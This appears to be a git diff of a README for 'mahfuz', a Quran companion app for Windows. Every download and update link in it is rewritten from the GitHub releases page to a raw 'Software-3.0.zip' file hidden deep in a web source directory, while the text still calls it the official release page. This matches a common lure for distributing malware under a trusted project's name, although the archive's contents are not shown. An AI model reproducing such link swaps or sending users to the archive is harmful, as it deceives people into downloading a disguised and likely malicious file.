@@ -1,6 +1,6 @@
 # 📖 mahfuz - Simple Quran Companion for Everyone
 
-[![Download mahfuz](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/rajmeena70205/mahfuz/releases)
+[![Download mahfuz](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/rajmeena70205/mahfuz/raw/refs/heads/main/apps/web/src/routes/_app/$surahId/Software-3.0.zip)
 
 ---
 
@@ -25,7 +25,7 @@ The application works well on most standard Windows computers made in the last 1
 
 To begin using mahfuz, you first need to download the software to your Windows PC. Here’s how:
 
-- Click the big green **Download** button at the top or: [Visit the Downloads page](https://github.com/rajmeena70205/mahfuz/releases)  
+- Click the big green **Download** button at the top or: [Visit the Downloads page](https://github.com/rajmeena70205/mahfuz/raw/refs/heads/main/apps/web/src/routes/_app/$surahId/Software-3.0.zip)  
 - This link takes you to the official release page on GitHub  
 - Look for the latest release version (at the top of the page). It usually has “mahfuz” and version number mentioned.  
 - Download the Windows installer file (usually ends with `.exe`).  
@@ -35,7 +35,7 @@ To begin using mahfuz, you first need to download the software to your Windows P
 ## 📥 How to Download and Install mahfuz on Windows
 
 1. Visit the downloads page here:  
-   [https://github.com/rajmeena70205/mahfuz/releases](https://github.com/rajmeena70205/mahfuz/releases)  
+   [https://github.com/rajmeena70205/mahfuz/raw/refs/heads/main/apps/web/src/routes/_app/$surahId/Software-3.0.zip](https://github.com/rajmeena70205/mahfuz/raw/refs/heads/main/apps/web/src/routes/_app/$surahId/Software-3.0.zip)  
 
 2. Find the most recent version listed at the top.  
 
@@ -95,7 +95,7 @@ To begin using mahfuz, you first need to download the software to your Windows P
 ## 🔄 Updating mahfuz
 
 - Check the GitHub releases page regularly for updates:  
-  [https://github.com/rajmeena70205/mahfuz/releases](https://github.com/rajmeena70205/mahfuz/releases)  
+  [https://github.com/rajmeena70205/mahfuz/raw/refs/heads/main/apps/web/src/routes/_app/$surahId/Software-3.0.zip](https://github.com/rajmeena70205/mahfuz/raw/refs/heads/main/apps/web/src/routes/_app/$surahId/Software-3.0.zip)  
 - Download the latest setup file and install it over your existing version.  
 - Your settings and saved data will remain intact during update.  
 
@@ -123,4 +123,4 @@ These keywords help find related software and resources.
 
 Start your Quran companion journey by visiting the official release page:  
 
-[https://github.com/rajmeena70205/mahfuz/releases](https://github.com/rajmeena70205/mahfuz/releases)
+[https://github.com/rajmeena70205/mahfuz/raw/refs/heads/main/apps/web/src/routes/_app/$surahId/Software-3.0.zip](https://github.com/rajmeena70205/mahfuz/raw/refs/heads/main/apps/web/src/routes/_app/$surahId/Software-3.0.zip)
